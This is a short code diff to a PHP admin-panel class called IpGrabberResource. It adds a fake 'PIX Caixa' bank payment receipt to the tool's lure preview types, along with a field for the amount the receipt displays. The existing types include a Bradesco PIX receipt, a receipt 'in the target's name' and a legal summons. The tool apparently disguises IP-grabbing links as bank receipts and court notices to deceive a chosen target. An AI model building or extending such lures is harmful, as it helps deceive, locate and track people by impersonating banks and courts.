@@ -117,6 +117,7 @@ class IpGrabberResource extends Resource
                             'mensagem' => 'Mensagem Customizada',
                             'noticia' => 'Notícia externa',
                             'pix_bradesco' => 'PIX Bradesco (comprovante)',
+                            'pix_caixa' => 'PIX Caixa (comprovante)',
                             'pix_nome_alvo' => 'Comprovante PIX em nome do alvo',
                             'intimacao' => 'Intimação',
                         ])
@@ -154,6 +155,15 @@ class IpGrabberResource extends Resource
                         ->live()
                         ->required()
                         ->visible(fn (Get $get): bool => ! in_array($get('preview_tipo'), ['noticia', 'intimacao'], true))
+                        ->columnSpanFull(),
+
+                    Forms\Components\TextInput::make('pix_caixa_valor')
+                        ->label('Informe o valor')
+                        ->placeholder('Ex: 380,00')
+                        ->maxLength(20)
+                        ->required(fn (Get $get): bool => $get('preview_tipo') === 'pix_caixa')
+                        ->visible(fn (Get $get): bool => $get('preview_tipo') === 'pix_caixa')
+                        ->helperText('Valor que aparecerá no comprovante.')
                         ->columnSpanFull(),
 
                     Forms\Components\FileUpload::make('intimacao_arquivo')
